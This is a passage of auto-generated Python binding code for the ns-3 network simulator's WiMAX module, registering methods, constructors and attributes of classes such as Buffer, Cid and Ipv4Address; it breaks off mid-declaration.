register_Ns3UplinkScheduler_methods(root_module, root_module['ns3::UplinkScheduler'])
register_Ns3UplinkSchedulerMBQoS_methods(root_module, root_module['ns3::UplinkSchedulerMBQoS'])
register_Ns3UplinkSchedulerRtps_methods(root_module, root_module['ns3::UplinkSchedulerRtps'])
register_Ns3UplinkSchedulerSimple_methods(root_module, root_module['ns3::UplinkSchedulerSimple'])
register_Ns3WimaxConnection_methods(root_module, root_module['ns3::WimaxConnection'])
register_Ns3WimaxMacQueue_methods(root_module, root_module['ns3::WimaxMacQueue'])
register_Ns3WimaxMacToMacHeader_methods(root_module, root_module['ns3::WimaxMacToMacHeader'])
register_Ns3WimaxPhy_methods(root_module, root_module['ns3::WimaxPhy'])
register_Ns3AttributeAccessor_methods(root_module, root_module['ns3::AttributeAccessor'])
register_Ns3AttributeChecker_methods(root_module, root_module['ns3::AttributeChecker'])
register_Ns3AttributeValue_methods(root_module, root_module['ns3::AttributeValue'])
register_Ns3BSScheduler_methods(root_module, root_module['ns3::BSScheduler'])
register_Ns3BSSchedulerRtps_methods(root_module, root_module['ns3::BSSchedulerRtps'])
register_Ns3BSSchedulerSimple_methods(root_module, root_module['ns3::BSSchedulerSimple'])
register_Ns3BandwidthRequestHeader_methods(root_module, root_module['ns3::BandwidthRequestHeader'])
register_Ns3BsServiceFlowManager_methods(root_module, root_module['ns3::BsServiceFlowManager'])
register_Ns3CallbackChecker_methods(root_module, root_module['ns3::CallbackChecker'])
register_Ns3CallbackImplBase_methods(root_module, root_module['ns3::CallbackImplBase'])
register_Ns3CallbackValue_methods(root_module, root_module['ns3::CallbackValue'])
register_Ns3Channel_methods(root_module, root_module['ns3::Channel'])
register_Ns3ConnectionManager_methods(root_module, root_module['ns3::ConnectionManager'])
register_Ns3Dcd_methods(root_module, root_module['ns3::Dcd'])
register_Ns3DlMap_methods(root_module, root_module['ns3::DlMap'])
register_Ns3DsaAck_methods(root_module, root_module['ns3::DsaAck'])
register_Ns3DsaReq_methods(root_module, root_module['ns3::DsaReq'])
register_Ns3DsaRsp_methods(root_module, root_module['ns3::DsaRsp'])
register_Ns3EmptyAttributeValue_methods(root_module, root_module['ns3::EmptyAttributeValue'])
register_Ns3EventImpl_methods(root_module, root_module['ns3::EventImpl'])
register_Ns3FixedRssLossModel_methods(root_module, root_module['ns3::FixedRssLossModel'])
register_Ns3FragmentationSubheader_methods(root_module, root_module['ns3::FragmentationSubheader'])
register_Ns3FriisPropagationLossModel_methods(root_module, root_module['ns3::FriisPropagationLossModel'])
register_Ns3GenericMacHeader_methods(root_module, root_module['ns3::GenericMacHeader'])
register_Ns3GrantManagementSubheader_methods(root_module, root_module['ns3::GrantManagementSubheader'])
register_Ns3IpcsClassifier_methods(root_module, root_module['ns3::IpcsClassifier'])
register_Ns3Ipv4AddressChecker_methods(root_module, root_module['ns3::Ipv4AddressChecker'])
register_Ns3Ipv4AddressValue_methods(root_module, root_module['ns3::Ipv4AddressValue'])
register_Ns3Ipv4MaskChecker_methods(root_module, root_module['ns3::Ipv4MaskChecker'])
register_Ns3Ipv4MaskValue_methods(root_module, root_module['ns3::Ipv4MaskValue'])
register_Ns3Ipv6AddressChecker_methods(root_module, root_module['ns3::Ipv6AddressChecker'])
register_Ns3Ipv6AddressValue_methods(root_module, root_module['ns3::Ipv6AddressValue'])
register_Ns3Ipv6PrefixChecker_methods(root_module, root_module['ns3::Ipv6PrefixChecker'])
register_Ns3Ipv6PrefixValue_methods(root_module, root_module['ns3::Ipv6PrefixValue'])
register_Ns3LogDistancePropagationLossModel_methods(root_module, root_module['ns3::LogDistancePropagationLossModel'])
register_Ns3Mac48AddressChecker_methods(root_module, root_module['ns3::Mac48AddressChecker'])
register_Ns3Mac48AddressValue_methods(root_module, root_module['ns3::Mac48AddressValue'])
register_Ns3MatrixPropagationLossModel_methods(root_module, root_module['ns3::MatrixPropagationLossModel'])
register_Ns3NakagamiPropagationLossModel_methods(root_module, root_module['ns3::NakagamiPropagationLossModel'])
register_Ns3NetDevice_methods(root_module, root_module['ns3::NetDevice'])
register_Ns3NixVector_methods(root_module, root_module['ns3::NixVector'])
register_Ns3Node_methods(root_module, root_module['ns3::Node'])
register_Ns3ObjectFactoryChecker_methods(root_module, root_module['ns3::ObjectFactoryChecker'])
register_Ns3ObjectFactoryValue_methods(root_module, root_module['ns3::ObjectFactoryValue'])
register_Ns3OutputStreamWrapper_methods(root_module, root_module['ns3::OutputStreamWrapper'])
register_Ns3Packet_methods(root_module, root_module['ns3::Packet'])
register_Ns3RandomVariableChecker_methods(root_module, root_module['ns3::RandomVariableChecker'])
register_Ns3RandomVariableValue_methods(root_module, root_module['ns3::RandomVariableValue'])
register_Ns3SimpleOfdmWimaxPhy_methods(root_module, root_module['ns3::SimpleOfdmWimaxPhy'])
register_Ns3TimeChecker_methods(root_module, root_module['ns3::TimeChecker'])
register_Ns3TimeValue_methods(root_module, root_module['ns3::TimeValue'])
register_Ns3TypeIdChecker_methods(root_module, root_module['ns3::TypeIdChecker'])
register_Ns3TypeIdValue_methods(root_module, root_module['ns3::TypeIdValue'])
register_Ns3UintegerValue_methods(root_module, root_module['ns3::UintegerValue'])
register_Ns3WimaxChannel_methods(root_module, root_module['ns3::WimaxChannel'])
register_Ns3WimaxNetDevice_methods(root_module, root_module['ns3::WimaxNetDevice'])
register_Ns3AddressChecker_methods(root_module, root_module['ns3::AddressChecker'])
register_Ns3AddressValue_methods(root_module, root_module['ns3::AddressValue'])
register_Ns3BaseStationNetDevice_methods(root_module, root_module['ns3::BaseStationNetDevice'])
register_Ns3SimpleOfdmWimaxChannel_methods(root_module, root_module['ns3::SimpleOfdmWimaxChannel'])
register_Ns3SubscriberStationNetDevice_methods(root_module, root_module['ns3::SubscriberStationNetDevice'])
return
def register_Ns3Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type'), param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_constructor([param('ns3::Address const &', 'address')])
cls.add_method('CheckCompatible',
'bool',
[param('uint8_t', 'type'), param('uint8_t', 'len')],
is_const=True)
cls.add_method('CopyAllFrom',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_method('CopyAllTo',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint8_t', 'len')],
is_const=True)
cls.add_method('CopyFrom',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_method('CopyTo',
'uint32_t',
[param('uint8_t *', 'buffer')],
is_const=True)
cls.add_method('Deserialize',
'void',
[param('ns3::TagBuffer', 'buffer')])
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('IsInvalid',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('uint8_t', 'type')],
is_const=True)
cls.add_method('Register',
'uint8_t',
[],
is_static=True)
cls.add_method('Serialize',
'void',
[param('ns3::TagBuffer', 'buffer')],
is_const=True)
return
def register_Ns3AsciiTraceHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::AsciiTraceHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateFileStream',
'ns3::Ptr< ns3::OutputStreamWrapper >',
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode', default_value='std::ios_base::out')])
cls.add_method('DefaultDequeueSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDequeueSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDropSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDropSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultEnqueueSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultEnqueueSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultReceiveSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultReceiveSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('GetFilenameFromDevice',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])
cls.add_method('GetFilenameFromInterfacePair',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])
return
def register_Ns3AsciiTraceHelperForDevice_methods(root_module, cls):
cls.add_constructor([param('ns3::AsciiTraceHelperForDevice const &', 'arg0')])
cls.add_constructor([])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::Ptr< ns3::NetDevice >', 'nd')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'ndName')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NetDeviceContainer', 'd')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NodeContainer', 'n')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'explicitFilename')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid')])
cls.add_method('EnableAsciiAll',
'void',
[param('std::string', 'prefix')])
cls.add_method('EnableAsciiAll',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream')])
cls.add_method('EnableAsciiInternal',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3AttributeConstructionList_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeConstructionList const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('std::string', 'name'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker'), param('ns3::Ptr< ns3::AttributeValue >', 'value')])
cls.add_method('Begin',
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',
[],
is_const=True)
cls.add_method('End',
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',
[],
is_const=True)
cls.add_method('Find',
'ns3::Ptr< ns3::AttributeValue >',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True)
return
def register_Ns3AttributeConstructionListItem_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::AttributeConstructionList::Item const &', 'arg0')])
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
cls.add_instance_attribute('value', 'ns3::Ptr< ns3::AttributeValue >', is_const=False)
return
def register_Ns3Buffer_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'dataSize')])
cls.add_constructor([param('uint32_t', 'dataSize'), param('bool', 'initialize')])
cls.add_constructor([param('ns3::Buffer const &', 'o')])
cls.add_method('AddAtEnd',
'bool',
[param('uint32_t', 'end')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::Buffer const &', 'o')])
cls.add_method('AddAtStart',
'bool',
[param('uint32_t', 'start')])
cls.add_method('Begin',
'ns3::Buffer::Iterator',
[],
is_const=True)
cls.add_method('CopyData',
'void',
[param('std::ostream *', 'os'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CopyData',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::Buffer',
[param('uint32_t', 'start'), param('uint32_t', 'length')],
is_const=True)
cls.add_method('CreateFullCopy',
'ns3::Buffer',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('End',
'ns3::Buffer::Iterator',
[],
is_const=True)
cls.add_method('GetCurrentEndOffset',
'int32_t',
[],
is_const=True)
cls.add_method('GetCurrentStartOffset',
'int32_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('PeekData',
'uint8_t const *',
[],
is_const=True)
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'start')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3BufferIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::Buffer::Iterator const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CalculateIpChecksum',
'uint16_t',
[param('uint16_t', 'size')])
cls.add_method('CalculateIpChecksum',
'uint16_t',
[param('uint16_t', 'size'), param('uint32_t', 'initialChecksum')])
cls.add_method('GetDistanceFrom',
'uint32_t',
[param('ns3::Buffer::Iterator const &', 'o')],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('IsEnd',
'bool',
[],
is_const=True)
cls.add_method('IsStart',
'bool',
[],
is_const=True)
cls.add_method('Next',
'void',
[])
cls.add_method('Next',
'void',
[param('uint32_t', 'delta')])
cls.add_method('Prev',
'void',
[])
cls.add_method('Prev',
'void',
[param('uint32_t', 'delta')])
cls.add_method('Read',
'void',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ReadLsbtohU16',
'uint16_t',
[])
cls.add_method('ReadLsbtohU32',
'uint32_t',
[])
cls.add_method('ReadLsbtohU64',
'uint64_t',
[])
cls.add_method('ReadNtohU16',
'uint16_t',
[])
cls.add_method('ReadNtohU32',
'uint32_t',
[])
cls.add_method('ReadNtohU64',
'uint64_t',
[])
cls.add_method('ReadU16',
'uint16_t',
[])
cls.add_method('ReadU32',
'uint32_t',
[])
cls.add_method('ReadU64',
'uint64_t',
[])
cls.add_method('ReadU8',
'uint8_t',
[])
cls.add_method('Write',
'void',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('Write',
'void',
[param('ns3::Buffer::Iterator', 'start'), param('ns3::Buffer::Iterator', 'end')])
cls.add_method('WriteHtolsbU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteHtolsbU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteHtolsbU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteHtonU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteHtonU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteHtonU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'data')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'data'), param('uint32_t', 'len')])
return
def register_Ns3ByteTagIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagIterator const &', 'arg0')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::ByteTagIterator::Item',
[])
return
def register_Ns3ByteTagIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagIterator::Item const &', 'arg0')])
cls.add_method('GetEnd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetStart',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTag',
'void',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
return
def register_Ns3ByteTagList_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ByteTagList const &', 'o')])
cls.add_method('Add',
'ns3::TagBuffer',
[param('ns3::TypeId', 'tid'), param('uint32_t', 'bufferSize'), param('int32_t', 'start'), param('int32_t', 'end')])
cls.add_method('Add',
'void',
[param('ns3::ByteTagList const &', 'o')])
cls.add_method('AddAtEnd',
'void',
[param('int32_t', 'adjustment'), param('int32_t', 'appendOffset')])
cls.add_method('AddAtStart',
'void',
[param('int32_t', 'adjustment'), param('int32_t', 'prependOffset')])
cls.add_method('Begin',
'ns3::ByteTagList::Iterator',
[param('int32_t', 'offsetStart'), param('int32_t', 'offsetEnd')],
is_const=True)
cls.add_method('RemoveAll',
'void',
[])
return
def register_Ns3ByteTagListIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagList::Iterator const &', 'arg0')])
cls.add_method('GetOffsetStart',
'uint32_t',
[],
is_const=True)
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::ByteTagList::Iterator::Item',
[])
return
def register_Ns3ByteTagListIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagList::Iterator::Item const &', 'arg0')])
cls.add_constructor([param('ns3::TagBuffer', 'buf')])
cls.add_instance_attribute('buf', 'ns3::TagBuffer', is_const=False)
cls.add_instance_attribute('end', 'int32_t', is_const=False)
cls.add_instance_attribute('size', 'uint32_t', is_const=False)
cls.add_instance_attribute('start', 'int32_t', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3CallbackBase_methods(root_module, cls):
cls.add_constructor([param('ns3::CallbackBase const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetImpl',
'ns3::Ptr< ns3::CallbackImplBase >',
[],
is_const=True)
cls.add_constructor([param('ns3::Ptr< ns3::CallbackImplBase >', 'impl')],
visibility='protected')
cls.add_method('Demangle',
'std::string',
[param('std::string const &', 'mangled')],
is_static=True, visibility='protected')
return
def register_Ns3Cid_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Cid const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint16_t', 'cid')])
cls.add_method('Broadcast',
'ns3::Cid',
[],
is_static=True)
cls.add_method('GetIdentifier',
'uint16_t',
[],
is_const=True)
cls.add_method('InitialRanging',
'ns3::Cid',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsInitialRanging',
'bool',
[],
is_const=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsPadding',
'bool',
[],
is_const=True)
cls.add_method('Padding',
'ns3::Cid',
[],
is_static=True)
return
def register_Ns3CidFactory_methods(root_module, cls):
cls.add_constructor([param('ns3::CidFactory const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Allocate',
'ns3::Cid',
[param('ns3::Cid::Type', 'type')])
cls.add_method('AllocateBasic',
'ns3::Cid',
[])
cls.add_method('AllocateMulticast',
'ns3::Cid',
[])
cls.add_method('AllocatePrimary',
'ns3::Cid',
[])
cls.add_method('AllocateTransportOrSecondary',
'ns3::Cid',
[])
cls.add_method('FreeCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('IsBasic',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('IsPrimary',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('IsTransport',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
return
def register_Ns3CsParameters_methods(root_module, cls):
cls.add_constructor([param('ns3::CsParameters const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_constructor([param('ns3::CsParameters::Action', 'classifierDscAction'), param('ns3::IpcsClassifierRecord', 'classifier')])
cls.add_method('GetClassifierDscAction',
'ns3::CsParameters::Action',
[],
is_const=True)
cls.add_method('GetPacketClassifierRule',
'ns3::IpcsClassifierRecord',
[],
is_const=True)
cls.add_method('SetClassifierDscAction',
'void',
[param('ns3::CsParameters::Action', 'action')])
cls.add_method('SetPacketClassifierRule',
'void',
[param('ns3::IpcsClassifierRecord', 'packetClassifierRule')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3DcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::DcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBsEirp',
'uint16_t',
[],
is_const=True)
cls.add_method('GetEirxPIrMax',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetBsEirp',
'void',
[param('uint16_t', 'bs_eirp')])
cls.add_method('SetEirxPIrMax',
'void',
[param('uint16_t', 'rss_ir_max')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3DlFramePrefixIe_methods(root_module, cls):
cls.add_constructor([param('ns3::DlFramePrefixIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPreamblePresent',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRateId',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetLength',
'void',
[param('uint16_t', 'length')])
cls.add_method('SetPreamblePresent',
'void',
[param('uint8_t', 'preamblePresent')])
cls.add_method('SetRateId',
'void',
[param('uint8_t', 'rateId')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3EventId_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::EventId const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::EventImpl > const &', 'impl'), param('uint64_t', 'ts'), param('uint32_t', 'context'), param('uint32_t', 'uid')])
cls.add_method('Cancel',
'void',
[])
cls.add_method('GetContext',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTs',
'uint64_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint32_t',
[],
is_const=True)
cls.add_method('IsExpired',
'bool',
[],
is_const=True)
cls.add_method('IsRunning',
'bool',
[],
is_const=True)
cls.add_method('PeekEventImpl',
'ns3::EventImpl *',
[],
is_const=True)
return
def register_Ns3IpcsClassifierRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::IpcsClassifierRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask'), param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask'), param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh'), param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh'), param('uint8_t', 'protocol'), param('uint8_t', 'priority')])
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_method('AddDstAddr',
'void',
[param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask')])
cls.add_method('AddDstPortRange',
'void',
[param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh')])
cls.add_method('AddProtocol',
'void',
[param('uint8_t', 'proto')])
cls.add_method('AddSrcAddr',
'void',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask')])
cls.add_method('AddSrcPortRange',
'void',
[param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh')])
cls.add_method('CheckMatch',
'bool',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],
is_const=True)
cls.add_method('GetCid',
'uint16_t',
[],
is_const=True)
cls.add_method('GetIndex',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPriority',
'uint8_t',
[],
is_const=True)
cls.add_method('SetCid',
'void',
[param('uint16_t', 'cid')])
cls.add_method('SetIndex',
'void',
[param('uint16_t', 'index')])
cls.add_method('SetPriority',
'void',
[param('uint8_t', 'prio')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3Ipv4Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Ipv4Address const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'address')])
cls.add_constructor([param('char const *', 'address')])
cls.add_method('CombineMask',
'ns3::Ipv4Address',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('ConvertFrom',
'ns3::Ipv4Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('Deserialize',
'ns3::Ipv4Address',
[param('uint8_t const *', 'buf')],
is_static=True)
cls.add_method('Get',
'uint32_t',
[],
is_const=True)
cls.add_method('GetAny',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetBroadcast',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetLoopback',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetSubnetDirectedBroadcast',
'ns3::Ipv4Address',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv4Address const &', 'other')],
is_const=True)
cls.add_method('IsLocalMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsSubnetDirectedBroadcast',
'bool',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Serialize',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('Set',
'void',
[param('uint32_t', 'address')])
cls.add_method('Set',
'void',
[param('char const *', 'address')])
return
def register_Ns3Ipv4Mask_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Ipv4Mask const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'mask')])
cls.add_constructor([param('char const *', 'mask')])
cls.add_method('Get',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInverse',
'uint32_t',
[],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('GetPrefixLength',
'uint16_t',
[],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv4Mask', 'other')],
is_const=True)
cls.add_method('IsMatch',
'bool',
